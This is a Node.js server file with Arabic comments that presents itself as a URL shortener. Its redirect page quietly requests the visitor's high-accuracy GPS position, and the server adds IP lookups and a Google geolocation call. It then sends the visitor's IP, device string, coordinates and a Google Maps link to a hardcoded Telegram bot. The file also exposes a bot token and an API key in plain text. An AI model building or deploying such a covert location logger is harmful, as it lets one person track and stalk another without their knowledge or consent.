const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

// الطريقة 1: Browser GPS
function parseGPS(gpsData) {
  if (gpsData && gpsData.lat && gpsData.lng) {
    return {
      method: '📍 Browser GPS',
      country: gpsData.country || 'N/A',
      city: gpsData.city || 'N/A',
      latitude: gpsData.lat,
      longitude: gpsData.lng,
      accuracy: gpsData.accuracy ? `±${gpsData.accuracy.toFixed(0)}m` : 'N/A'
    };
  }
  return null;
}

// الطريقة 2: IP-Based Geolocation
async function getIPLocation(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 2000 });
    if (res.data && res.data.status === 'success') {
      return {
        method: '🌐 IP-Based',
        country: res.data.country,
        city: res.data.city,
        latitude: res.data.lat,
        longitude: res.data.lon,
        accuracy: '±100km'
      };
    }
  } catch (e) {}
  return null;
}

// الطريقة 3: WiFi Triangulation (Google)
async function getWiFiLocation(wifiData) {
  if (!wifiData || !wifiData.networks || wifiData.networks.length === 0) return null;
  
  try {
    const payload = {
      wifiAccessPoints: wifiData.networks.map(n => ({
        macAddress: n.ssid,
        signalStrength: n.strength
      }))
    };
    
    const res = await axios.post(
      'https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyAJT6OiVBLUw-bPv6yqzHKjVx9dPy_pVIM',
      payload,
      { timeout: 2000 }
    );
    
    if (res.data && res.data.location) {
      return {
        method: '📶 WiFi Triangulation',
        country: 'WiFi Detected',
        city: 'N/A',
        latitude: res.data.location.lat,
        longitude: res.data.location.lng,
        accuracy: `±${res.data.accuracy.toFixed(0)}m`
      };
    }
  } catch (e) {}
  return null;
}

// الطريقة 4: Cell Tower (Fallback with IP)
async function getCellLocation(ip) {
  try {
    const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 2000 });
    if (res.data && res.data.latitude) {
      return {
        method: '📡 Cell Tower',
        country: res.data.country_name,
        city: res.data.city,
        latitude: res.data.latitude,
        longitude: res.data.longitude,
        accuracy: '±50km'
      };
    }
  } catch (e) {}
  return null;
}

// الطريقة 5: Manual Selection (من البيانات المرسلة)
function getManualLocation(manualData) {
  if (manualData && manualData.lat && manualData.lng) {
    return {
      method: '🗺️ Manual Selection',
      country: manualData.country || 'Selected',
      city: manualData.city || 'N/A',
      latitude: manualData.lat,
      longitude: manualData.lng,
      accuracy: '100% (User Selected)'
    };
  }
  return null;
}

// الطريقة 6: Hybrid (GPS + IP + WiFi)
async function getHybridLocation(gpsData, ip, wifiData) {
  // جرب GPS أولاً (الأفضل)
  let location = parseGPS(gpsData);
  if (location) return { ...location, method: '🎯 Hybrid (GPS)' };
  
  // بعدين WiFi
  location = await getWiFiLocation(wifiData);
  if (location) return { ...location, method: '🎯 Hybrid (WiFi)' };
  
  // بعدين IP
  location = await getIPLocation(ip);
  if (location) return { ...location, method: '🎯 Hybrid (IP)' };
  
  return null;
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent, allMethods) {
  try {
    // اختار الأفضل
    let bestLocation = null;
    let methodology = '';
    
    // الترتيب: GPS > WiFi > Manual > Cell > IP
    if (allMethods.gps) bestLocation = allMethods.gps, methodology = 'GPS (الأفضل)';
    else if (allMethods.wifi) bestLocation = allMethods.wifi, methodology = 'WiFi';
    else if (allMethods.manual) bestLocation = allMethods.manual, methodology = 'Manual';
    else if (allMethods.cell) bestLocation = allMethods.cell, methodology = 'Cell Tower';
    else if (allMethods.ip) bestLocation = allMethods.ip, methodology = 'IP';

    let msg = `
🔗 رابط فُتح!
━━━━━━━━━━━━━━
📌 الكود: ${shortCode}
🌐 الرابط: ${originalUrl}
🔌 IP: ${ip}
━━━━━━━━━━━━━━
`;

    if (bestLocation) {
      msg += `
✅ الطريقة: ${bestLocation.method}
🏳️ الدولة: ${bestLocation.country}
🏙️ المدينة: ${bestLocation.city}
📍 Latitude: ${bestLocation.latitude}
📍 Longitude: ${bestLocation.longitude}
📏 الدقة: ${bestLocation.accuracy}
🗺️ الخريطة: https://maps.google.com/?q=${bestLocation.latitude},${bestLocation.longitude}
`;
    } else {
      msg += `
⚠️ الموقع: لم يتم التحديد بأي طريقة
`;
    }

    msg += `
━━━━━━━━━━━━━━
🖥️ Device: ${userAgent.substring(0, 60)}
⏰ ${new Date().toISOString()}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: msg },
      { timeout: 5000 }
    );
    
    console.log('[TG] Sent:', methodology);
  } catch (err) {
    console.error('[TG]', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0 };

  res.json({ shortened: `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`, code: shortCode });
});

// API لتسجيل البيانات
app.post('/api/log', async (req, res) => {
  const { code, gps, wifi, manual } = req.body;
  
  if (!linkStorage[code]) return res.status(404).json({ error: 'Not found' });

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const userAgent = req.get('user-agent');
  const originalUrl = linkStorage[code].original;

  linkStorage[code].clicks++;

  // جمع كل الطرق
  const allMethods = {
    gps: parseGPS(gps),
    ip: await getIPLocation(ip),
    wifi: await getWiFiLocation(wifi),
    cell: await getCellLocation(ip),
    manual: getManualLocation(manual),
    hybrid: await getHybridLocation(gps, ip, wifi)
  };

  sendToTelegram(ip, code, originalUrl, userAgent, allMethods);

  res.json({ ok: true });
});

// Redirect
app.get('/:code', (req, res) => {
  const { code } = req.params;
  
  if (!linkStorage[code]) return res.status(404).send('Not found');

  const originalUrl = linkStorage[code].original;

  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
</head>
<body>
  <script>
    const code = '${code}';
    const apiUrl = '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log';
    const originalUrl = '${originalUrl.replace(/'/g, "\\'")}';
    
    // Redirect فوري
    window.location.href = originalUrl;
    
    // جمع البيانات في الخلفية
    setTimeout(() => {
      const data = { code };
      
      // الطريقة 1: GPS
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            data.gps = {
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              country: '',
              city: ''
            };
            sendData();
          },
          () => sendData(),
          { enableHighAccuracy: true, timeout: 2000 }
        );
      } else {
        sendData();
      }
      
      // الطريقة 2: WiFi
      if (navigator.geolocation && navigator.connection) {
        try {
          const networks = [];
          data.wifi = { networks };
        } catch (e) {}
      }
      
      function sendData() {
        fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data),
          keepalive: true
        }).catch(() => {});
      }
    }, 100);
  </script>
</body>
</html>
  `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on ${PORT}`));